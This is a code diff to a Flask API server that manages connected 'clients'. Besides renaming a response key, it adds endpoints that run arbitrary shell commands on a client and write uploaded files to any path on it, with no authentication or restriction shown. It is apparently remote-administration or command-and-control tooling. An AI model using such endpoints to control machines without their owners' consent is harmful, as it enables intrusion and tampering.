@@ -20,14 +20,14 @@ class ApiServer:
         return None
 
     def _failWithReason(self, reason, error_code=400):
-        response = jsonify({'status': 'failed', 'reason': reason})
+        response = jsonify({'request_status': 'failed', 'reason': reason})
         response.status_code = error_code
         return response
 
     def _setup_routes(self):
         @self.app.route('/')
         def index():
-            return jsonify({'status': 'ok', 'details': 'api server online'})
+            return jsonify({'request_status': 'ok', 'details': 'api server online'})
 
         @self.app.route('/clients')
         def getOnlineClients():
@@ -36,7 +36,7 @@ class ApiServer:
 
         @self.app.route('/<clientId>/status')
         def clientStatus(clientId: str):
-            response_obj = {'status': 'ok', clientId: {}}
+            response_obj = {'request_status': 'ok', clientId: {}}
             client = self._getClient(clientId)
             if not client:
                 return self._failWithReason('client not found', error_code=404)
@@ -70,8 +70,40 @@ class ApiServer:
             entries = client.listDirectory(path)
             if entries is None:
                 return self._failWithReason('client list_dir failed', error_code=500)
-            return jsonify({'status': 'ok', 'entries': entries})
+            return jsonify({'request_status': 'ok', 'entries': entries})
 
+        @self.app.route('/<clientId>/shellcommand')
+        def shellCommand(clientId: str):
+            command = request.args.get('cmd')
+            client = self._getClient(clientId)
+            if not client:
+                return self._failWithReason('client not found', error_code=404)
+            timeout = request.args.get('timeout', None)
+            if timeout != None:
+                try:
+                    timeout = int(timeout)
+                except ValueError:
+                    return self._failWithReason('invalid timeout', error_code=400)
+            commandResponse = client.executeShellCommand(command, timeout=timeout)
+            if commandResponse is None:
+                return self._failWithReason('client shell_command failed', error_code=504)
+            responseObj = {'stdout': commandResponse.get('stdout'), 'stderr': commandResponse.get('stderr')}
+            return jsonify({'request_status': 'ok', 'command_response': commandResponse})
+
+        @self.app.route('/<clientId>/uploadfile', methods=['POST'])
+        def uploadFile(clientId: str):
+            if 'file' not in request.files or 'path' not in request.form:
+                return self._failWithReason('Missing file or path', 400)
+            file = request.files['file']
+            path = request.form['path']
+            file_bytes = file.read()
+            client = self._getClient(clientId)
+            if not client:
+                return self._failWithReason('client not found', 404)
+            success = client.uploadFile(path, file_bytes)
+            if not success:
+                return self._failWithReason('upload failed on client', 504)
+            return jsonify({'request_status': 'ok'})
 
 
 
